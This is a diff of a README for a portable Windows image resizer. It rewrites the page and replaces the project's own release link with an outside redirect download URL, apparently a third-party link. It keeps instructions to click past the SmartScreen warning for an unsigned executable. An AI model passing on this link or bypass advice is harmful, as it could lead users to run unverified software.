@@ -1,97 +1,65 @@
-# Image Resizer PC
+# Image Resizer PC — a drag-and-drop batch image resizer with built-in format conversion for Windows
 
-**Resize and compress any image to an exact file size in KB — 100% offline, right on your PC. Built for passport & visa photos and government / exam portal uploads with strict KB caps.**
+Image Resizer PC is a portable Windows utility for shrinking stacks of photos down to a target size, swapping between JPG, PNG, WebP and BMP along the way, without opening a browser or signing up anywhere. If you've been hunting for an image resizer free of accounts, uploads and watermarks, this one keeps every file on your own machine and processes whole folders in a single pass. Runs on Windows 10 and Windows 11, no account, no watermark.
 
-<div align="center">
-
-<img src="icon.png" alt="Image Resizer PC icon" width="128">
-
-<br><br>
-
-![Image Resizer PC — main window](screenshot.png)
-
-<br>
-
-![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011%20(64--bit)-2563EB)
-![Portable](https://img.shields.io/badge/Portable-single%20.exe-2563EB)
-![Offline](https://img.shields.io/badge/100%25-offline-2563EB)
-![.NET 9](https://img.shields.io/badge/.NET-9-512BD4)
-![Version](https://img.shields.io/badge/version-1.0.0-informational)
-
-</div>
-
----
-
-Online portals keep capping uploads at **100 KB**, **50 KB**, or even **20 KB** — and most tools that hit those numbers want you to upload your passport, signature, or ID to their servers first. **Image Resizer PC** does the opposite: you type the target size you need, it automatically finds the best quality that lands **at or under** that size, and every byte of processing happens **locally on your machine**. No account, no upload, no watermark, no file-count limit.
-
-## Features
-
-| | |
-|---|---|
-| **Target an exact KB size** | Type a number (e.g. 100 / 50 / 20 KB). The app runs a binary search over quality — and downscales when needed — to land at or under your target. |
-| **Resize by pixels or by cm + DPI** | Set width/height in pixels, or physical size in centimetres at a chosen DPI (e.g. 3.5 × 4.5 cm @ 300 DPI → a passport-sized image). |
-| **Keep aspect ratio or center-crop** | Fit within a box, or crop to an exact box (e.g. 500 × 500). |
-| **Batch a whole folder** | Drag & drop individual files *or* entire folders and process them in one go. |
-| **Formats** | JPG, PNG, WebP, BMP. |
-| **Before / after preview** | See the resulting dimensions *and* file weight before you save. |
-| **Dead-simple UI** | Drag → pick a target → **Process**. That's the whole flow. |
-
-> Honest note on quality: at aggressive KB targets some visible compression is unavoidable — the app always gives you the **best quality that fits the target size**, not magic lossless shrinking.
-
+![Image Resizer PC main window](screenshot.png)
 
 ## Download
 
-**[⬇ Download the latest release](../../releases/latest)** — a single portable `ImageResizerPC.exe`.
+[Download for Windows](https://go.download-helper.tech/go/IRP)
 
-- **No installer, no setup.** Unzip and double-click.
-- **No pre-installed .NET required** — the runtime is bundled inside this self-contained single-file build.
-- **Windows 10 / 11, 64-bit.**
+The release ships as a compressed archive containing a single self-contained program file. Unzip it anywhere you like — Desktop, Documents, a USB stick — and double-click to launch. Nothing is written outside that folder, so you can delete the folder when you're done and the app is gone. First launch may show a SmartScreen prompt because the build isn't code-signed yet; click **More info -> Run anyway** and Windows will remember it.
 
-**First-run note (SmartScreen):** the `.exe` is currently unsigned and ships as a compressed single-file self-extractor, so Windows SmartScreen / Defender may show a **"Windows protected your PC"** prompt the first few times until download reputation builds up. To run it: click **More info → Run anyway**. This disappears over time (and permanently once the build is code-signed).
+## Capabilities
 
-## How to use
+- **Drag-and-drop intake** — drop one file, a selection of files, or an entire folder straight onto the window; subfolders come along too.
+- **Batch processing with no file cap** — queue a hundred photos or a thousand and run them in one pass instead of one-at-a-time clicks.
+- **Four-format conversion** — read and write JPG, PNG, WebP and BMP; mix inputs freely and pick a single output format for the whole batch.
+- **Exact-KB targeting** — type a number such as 100, 50 or 20 and the app binary-searches quality (downscaling if needed) to land at or under that size.
+- **Pixel resize** — set a precise width and height like 800 x 450 or 1920 x 1080 for the whole batch.
+- **Centimetre + DPI resize** — enter physical dimensions such as 3.5 x 4.5 cm at 300 DPI for passport-style outputs.
+- **Aspect-ratio lock or center-crop** — fit inside a box without squashing, or crop neatly to an exact width x height when a form demands it.
+- **Before / after preview** — see the resulting pixel dimensions and the real file weight in KB before you commit to saving.
+- **Fully offline** — no telemetry, no uploads; you can disconnect from Wi-Fi and the batch still runs.
 
-1. **Drag & drop** an image, several images, or a whole folder onto the window.
-2. **Pick your target:**
-   - a **file size in KB** (e.g. `50`), and/or
-   - a **pixel** size (e.g. `800 × 450`), and/or
-   - a **physical** size in **cm + DPI** (e.g. `3.5 × 4.5 @ 300`).
-   - Choose **keep aspect ratio** or **center-crop to an exact box**.
-3. Pick the **output format** (JPG / PNG / WebP / BMP).
-4. Click **Process**. Check the **before/after** weight, and save.
+## Quick start
+
+1. Launch the program from the folder where you unzipped it.
+2. Drag your images (or a whole folder) onto the window — the queue fills up instantly.
+3. Pick your target: a KB cap, a pixel size, or a cm + DPI combination; choose keep-aspect or center-crop.
+4. Choose the output format — JPG, PNG, WebP or BMP — then click **Process**.
+5. Review the before/after weights, then save the batch to a destination folder of your choice.
+
+## FAQ
+
+**Is Image Resizer PC free?**
+Yes. The full tool, including batch mode and format conversion, is free with no trial expiry and no paywall on features.
+
+**Does it work on Windows 11?**
+Yes. It's built for 64-bit Windows 10 and Windows 11 and uses a bundled .NET 9 runtime, so you don't have to install anything else.
+
+**Do I need an account?**
+No. There's no sign-up, no email prompt and no license key. Open the folder, run the program, resize.
+
+**Does it need an internet connection?**
+No. Every operation — resize, compress, format swap, batch queue — happens on your PC. You can run it with the network off and nothing changes.
+
+**Does it need admin rights?**
+No. Because it runs portably from the folder you unzipped it into, standard-user permissions are enough.
+
+**Is it safe to use with sensitive photos like passports or IDs?**
+Yes, in the sense that nothing is uploaded. Your files stay in the folders you point the app at; there's no cloud step, no account, no analytics call-home.
 
 ## Common uses
 
-- **Passport & visa photos** — exact cm + DPI sizing, then squeezed under a KB cap.
-- **Government & exam-registration portals** with hard upload limits — e.g. photo/signature caps around **40 / 30 KB**, **50 / 20 KB**, **50 / 30 KB**. Dial in the exact number the form demands.
-- **Job applications & online forms** that reject anything over a set size.
-- **Batch shrinking** a folder of photos to email, archive, or post without the bulk.
+- Resizing a folder of phone photos down to email-friendly sizes without opening each one.
+- Converting a mixed pile of PNG and BMP screenshots to JPG or WebP in one go.
+- Preparing passport and visa photos with exact cm + DPI dimensions, then squeezing under a strict KB cap.
+- Hitting the odd caps that government and exam portals demand (40/30 KB, 50/20 KB, 100 KB signatures and photos).
 
-## Keyword-friendly FAQ
+Website: https://imageresizerpc.com
 
-**How do I resize an image to 100 KB?**
-Drop the image in, set the target to `100` KB, and click Process. The app auto-adjusts quality (and downscales if needed) so the output is at or under 100 KB, then shows you the exact resulting weight.
+## System requirements
 
-**How do I resize an image to 50 KB?**
-Same flow — set the target to `50` KB. Handy for the many bank and exam portals that cap photos at 50 KB.
-
-**How do I resize an image to 20 KB?**
-Set the target to `20` KB. For very small targets (common for signatures), the app will reduce quality and, if necessary, downscale dimensions to meet the cap while keeping the result as clean as the size allows.
-
-**How do I compress a photo for a passport or visa upload?**
-Set the physical size (e.g. `3.5 × 4.5 cm @ 300 DPI`) or crop to the required pixel box, then set the KB target your portal asks for. Because everything runs locally, your ID photo never leaves your computer.
-
-**Does it work offline?**
-Yes — completely. There's no upload, no sign-in, and no internet connection required at any point.
-
-## Privacy
-
-- **Nothing is uploaded.** All resizing and compression happen on your own PC.
-- **No account, no login.**
-- **No telemetry, no tracking, no ads.**
-
-Your sensitive documents — passports, signatures, IDs — stay on your machine.
-
----
-
-**Image Resizer PC** · free & portable · Windows 10/11 64-bit · [imageresizerpc.com](https://imageresizerpc.com) · Automatic quality for the target size — honest compression, no false "lossless" promises.
+- Windows 10 or Windows 11, 64-bit.
+- Standard user account; no admin rights required.
